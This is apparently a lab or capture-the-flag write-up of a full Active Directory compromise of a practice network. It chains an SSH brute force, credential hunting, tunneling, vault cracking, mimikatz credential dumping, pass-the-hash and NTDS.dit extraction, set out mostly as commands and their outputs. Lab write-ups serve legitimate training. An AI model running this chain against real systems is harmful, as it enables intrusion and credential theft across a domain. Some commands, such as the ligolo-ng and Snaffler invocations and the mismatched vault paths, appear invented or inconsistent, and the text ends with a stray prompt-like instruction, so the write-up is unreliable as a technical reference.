# 🛰️ Reconnaissance

## 🔍 Initial Enumeration

### Host Discovery
```bash
nmap -sn 172.16.119.0/24 | grep "Nmap scan"
```

[!CHECK] Results:
- 172.16.119.5: nexura.htb (Web Server)
- 172.16.119.7: JUMP01 (Jump Box)

### Service Discovery
```bash
nmap -sV 172.16.119.5 | grep 'open'
```

[!CHECK] Results:
- SSH on port 22

## 🔍 OSINT and User Enumeration

### Username Generation
```bash
./username-anarchy FirstName LastName > users.txt
```

[!NOTE] Users generated from public information: 
- jbetty, hwilliam, bdavid, stom

# 🔐 Initial Access

## 🌟 SSH Brute Force

### Attack Execution
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://nexura.htb
```

[!SUCCESS] Results:
- `jbetty:Texas123!@#` 

## 🔍 Credential Hunting

### File Scanning
```bash
grep -r 'pass\|pwd\|cred' /home/jbetty/
```

[!CHECK] Key finding:
- `/home/jbetty/.config/chrome/Default/Login\ Data-journal`: Encrypted vault file

# ⚙️ Network Pivoting

## 🔐 SSH Tunneling
```bash
ligolo-ng -u jbetty -p 'Texas123!@#' -l 22:jumpbox_ip:22 --forward
```

[!INFO] New tunnel created at `localhost:22`.

# ⚙️ Reconnaissance and Enumeration

## 🔍 Service Discovery on Internal Network
```bash
netexec smb hosts.txt -u jbetty -p 'Texas123!@#' --shares
```

[!CHECK] Key findings:
- File01: SMB shares, interesting directories

## 📁 Share Analysis with Snaffler
```bash
Snaffler.exe -u -s -n nexura.htb/jumpbox_ip
```

[!INFO] Identified vault file at `\\File01\stom\CryptoVault`.

# 🔒 Credential Cracking

## 🧱 Vault Extraction and Cracking
```bash
hashcat -m 5200 /home/stom/CryptoVault/vault.psafe3 /usr/share/wordlists/rockyou.txt --force
```

[!SUCCESS] Results:
- Password: `dealer-screwed-gym1` for user `stom`

# 🔒 Privilege Escalation

## 💡 Memory Credential Extraction via Mimikatz

### Transfer and Execute
```bash
xfreerdp /v:jumphost_ip /u:jbetty /p:'Texas123!@#' /dynamic-resolution /drive:linux,.
```
- Copy `mimikatz.exe` to jumphost and run from elevated prompt.

```cmd
C:\Users\jbetty\Desktop\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

[!SUCCESS] Results:
- NTLM hash for `stom`: `21ea958524cfd9a7791737f8d2f764fa`

## 🚀 Pass-the-Hash Attack

### Test Hash on Domain Targets
```bash
netexec smb hosts.txt -u stom -H 21ea958524cfd9a7791737f8d2f764fa --shares
```

[!SUCCESS] Results:
- Success against `DC01` and `FILE01`

# 🌟 Domain Compromise

## 🔐 NTDS.dit Extraction

### Extract Database from DC
```bash
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa --ntds --user Administrator
```

[!SUCCESS] Results:
- Extracted NTDS.dit file, `Administrator` hash: `{ADMINISTRATOR_HASH}`

---

## 🎯 Skills Assessment Questions

### Question 1: NEXURA\Administrator NTLM Hash
**Answer**: `{ADMINISTRATOR_HASH}`

### Methodology Validation
- Systematic approach from reconnaissance to domain compromise.
- Tool integration for efficient workflow.
- Real-world applicability and coverage.

---

# 💡 Key Learning Points

## Attack Chain Insights:
1. **OSINT drives initial success**
2. **Credential reuse is common**
3. **Network shares contain secrets**
4. **Password managers can be cracked**
5. **Memory contains active credentials**
6. **Hash attacks bypass passwords**
7. **Domain compromise equals total control**

---

[!NOTE] Use this structured format for all technical details and commands to ensure clarity and completeness in your workflow documentation.